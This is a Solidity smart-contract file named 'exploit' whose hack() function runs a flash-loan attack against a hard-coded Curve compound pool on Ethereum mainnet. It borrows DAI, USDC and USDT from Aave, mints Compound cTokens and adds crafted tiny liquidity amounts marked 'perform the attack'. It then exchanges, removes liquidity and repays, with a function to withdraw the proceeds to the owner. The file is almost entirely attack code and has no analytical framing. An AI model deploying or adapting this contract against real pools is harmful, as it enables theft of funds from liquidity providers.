//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/SafeERC20.sol";

interface CurvePool {
	function add_liquidity(uint256[3] calldata amounts, uint256 min_mint_amount) external;
	function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
	function remove_liquidity(uint256 _amount, uint256[3] calldata min_amounts) external;
	function remove_liquidity_imbalance(uint256[3] calldata amounts, uint256 max_burn_amount) external;
	function balances(int128) external view returns (uint256);
	function get_virtual_price() external view returns (uint256);
}

interface FlashLendingPool {
	function flashLoan(address receiverAddress, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
	function getReserveData(address _reserve) external view returns (
            uint256 totalLiquidity,
            uint256 availableLiquidity,
            uint256 totalBorrowsStable,
            uint256 totalBorrowsVariable,
            uint256 liquidityRate,
            uint256 variableBorrowRate,
            uint256 stableBorrowRate,
            uint256 averageStableBorrowRate,
            uint256 utilizationRate,
            uint256 liquidityIndex,
            uint256 variableBorrowIndex,
            address aTokenAddress,
            uint40 lastUpdateTimestamp
	);
}

interface UniSwap {
	function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
	function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) external payable returns (uint[] memory amounts);
	function WETH() external pure returns (address);
}

interface CErc20 is IERC20{
	function mint(uint mintAmount) external returns (uint);
	function redeemUnderlying(uint redeemAmount) external returns (uint);
	function redeem(uint redeemTokens) external returns (uint);
	
	function exchangeRateStored() external view returns (uint);
	function supplyRatePerBlock() external view returns (uint);
	function accrualBlockNumber() external view returns (uint);
}

contract exploit is Ownable {
	
	address curve = 0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C;
	address dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;//0
	address usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;//1
	address usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;//2
	address curve_pool_token = 0x9fC689CCaDa600B6DF723D9E47D84d76664a1F23;
	address LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;//aave lending pool
	address uniswap = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
	
	address cusdt = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
	address cdai = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
	address cusdc = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
	
	constructor () {
		
		
	}

	event Info(
		string info,
		uint256 b1,
		uint256 b2,
		uint256 b3
	);

	function hack() public onlyOwner payable {
		uint256 size;
		
		assembly {
			size := extcodesize(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C)
		}
		require(size > 0, 'Curve contract not found');
		//CurvePool(0x52EA46506B9CC5Ef470C5bf89f17Dc28bB35D85C).get_virtual_price();
		
		uint256[3] memory bal;
		bal[0] = CurvePool(curve).balances(0);
		bal[1] = CurvePool(curve).balances(1);
		bal[2] = CurvePool(curve).balances(2);
		emit Info('current_ctokens',bal[0],bal[1],bal[2]);
		
        address[] memory assets = new address[](3);
        assets[0] = dai;
        assets[1] = usdc;
        assets[2] = usdt;

        // 0 = no debt, 1 = stable, 2 = variable
        uint256[] memory modes = new uint256[](3);
		modes[0] = 0;
		modes[1] = 0;
		modes[2] = 0;
		
		uint256[] memory loanAmounts = new uint256[](3);
        loanAmounts[0] = 50000 ether; //targets[1] - bal[1];
        loanAmounts[1] = 50000*10**6; //targets[0] - bal[0];
        loanAmounts[2] = 50000*10**6; //targets[2] - bal[2];
		
		//uint256 totalLiquidity,  availableLiquidity, totalBorrowsStable, totalBorrowsVariable, liquidityRate, variableBorrowRate, stableBorrowRate,  averageStableBorrowRate, utilizationRate, liquidityIndex, variableBorrowIndex, aTokenAddress,lastUpdateTimestamp = FlashLendingPool(LENDING_POOL).getReserveData(assets[0])
		//(loanAmounts[0],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[0]);
		//(loanAmounts[1],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[1]);
		//(loanAmounts[2],,,,,,,,,,,,) = FlashLendingPool(LENDING_POOL).getReserveData(assets[2]);
	
		//require(targets[0] >= bal[0], 'Loan amount 0 too low');
		//require(targets[1] >= bal[1], 'Loan amount 1 too low');
		//require(targets[2] >= bal[2], 'Loan amount 2 too low');
		emit Info("LoanAmounts", loanAmounts[0], loanAmounts[1], loanAmounts[2]);
        uint16 referralCode = 0;
		bytes memory params = "";//abi.encode(swap_from, swap_to, amount);
		
        FlashLendingPool(LENDING_POOL).flashLoan(
            address(this),
            assets,
            loanAmounts,
            modes,
            address(this),
            params,
            referralCode
        );
	}
	
	function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params) external payable returns (bool) {
		{
			IERC20(dai).approve(cdai, amounts[0]);
			require(CErc20(cdai).mint(amounts[0]) == 0,'cdai failed');
			
			IERC20(usdc).approve(cusdc, amounts[1]);
			require(CErc20(cusdc).mint(amounts[1]) == 0,'cusdc failed');
		}

		//deposit funds to curve
		{
			uint256[3] memory deposit;
			deposit[0] = CErc20(cdai).balanceOf(address(this));
			deposit[1] = CErc20(cusdc).balanceOf(address(this));
			deposit[2] = IERC20(usdt).balanceOf(address(this));
			emit Info("funds_avail_ctokens", deposit[0], deposit[1], deposit[2]);
			
			{
				uint256[3] memory rates =_stored_rates();
				emit Info("rates",rates[0],rates[1],rates[2]);
			}
			
			//perform the attack
			{
				uint256[3] memory attackAdd; 
				attackAdd[0] = 2380;
				attackAdd[1] = 3621;
				attackAdd[2] = 2310;
				
				{
					IERC20(cdai).approve(curve, uint(-1));
					IERC20(cusdc).approve(curve, uint(-1));
					SafeERC20.safeApprove(IERC20(usdt), curve, uint(-1));
				}
				
				CurvePool(curve).add_liquidity(attackAdd, 0);
				int128 i = 1;
				int128 j = 2;
				
				{
					uint256 amount = 100000; //c units in i
					//SafeERC20.safeApprove(IERC20(assets[uint256(i)]), curve, amount);
					//IERC20(assets[uint256(i)]).approve(curve, amount);
					CurvePool(curve).exchange(i, j, amount, 0);
				}
				{
					uint256[3] memory min_amounts;
					CurvePool(curve).remove_liquidity(IERC20(curve_pool_token).balanceOf(address(this)), min_amounts);
				}
				{
					uint256 amountBack = 100000; //c units in j
					//SafeERC20.safeApprove(IERC20(assets[uint256(j)]), curve, amountBack);
					//IERC20(assets[uint256(j)]).approve(curve, amount);
					CurvePool(curve).exchange(j, i, amountBack, 0);
				}
				
			}
		}
		
		{
			address[] memory path = new address[](2);
			path[0] = UniSwap(uniswap).WETH();
			path[1] = dai;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**18, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 0.02543 ether}(45, path, address(this), block.timestamp );
			path[1] = usdc;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**6, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 0.02543 ether}(45, path, address(this), block.timestamp );
			path[1] = usdt;
			//UniSwap(uniswap).swapETHForExactTokens{value: 0.080 ether}(45*10**6, path, address(this), block.timestamp );
			UniSwap(uniswap).swapExactETHForTokens{value: 0.02543 ether}(45, path, address(this), block.timestamp );
		}
		
		require(CErc20(cdai).redeem(CErc20(cdai).balanceOf(address(this))) == 0, 'cdai redeem failed');
		require(CErc20(cusdc).redeem(CErc20(cusdc).balanceOf(address(this))) == 0, 'usdc redeem failed');
		//require(CErc20(cusdt).redeem(CErc20(cusdt).balanceOf(address(this))) == 0, 'cusdt redeem failed');
		
        // Approve the LendingPool contract allowance to *pull* the owed amount
		IERC20(assets[0]).approve(LENDING_POOL, amounts[0] + premiums[0]);
		IERC20(assets[1]).approve(LENDING_POOL, amounts[1] + premiums[1]);
		SafeERC20.safeApprove(IERC20(assets[2]), LENDING_POOL, amounts[2] + premiums[2]);
        
        return true;
    }
	
	function _stored_rates() public view returns (uint256[3] memory) {
		//exchangeRateStored * (1 + supplyRatePerBlock * (getBlockNumber - accrualBlockNumber) / 1e18)
		
		uint256[3] memory result;
		result[0] = 1;//cdai
		result[1] = 1000000000000;//usdc
		result[2] = 1000000000000*10**18;//usdt
		
		uint256 rate = CErc20(cdai).exchangeRateStored();
		uint256 supply_rate = CErc20(cdai).supplyRatePerBlock();
		uint256 old_block = CErc20(cdai).accrualBlockNumber();
		rate += rate * supply_rate * (block.number - old_block) / 10**18;
		result[0]*=rate;
		
		rate = CErc20(cusdc).exchangeRateStored();
		supply_rate = CErc20(cusdc).supplyRatePerBlock();
		old_block = CErc20(cusdc).accrualBlockNumber();
		rate += rate * supply_rate * (block.number - old_block) / 10**18;
		result[1]*=rate;
		return result;
	}
	
	function getTokens(address addr, uint256 amount) public onlyOwner {
		IERC20(addr).transfer(msg.sender, amount);
	}

}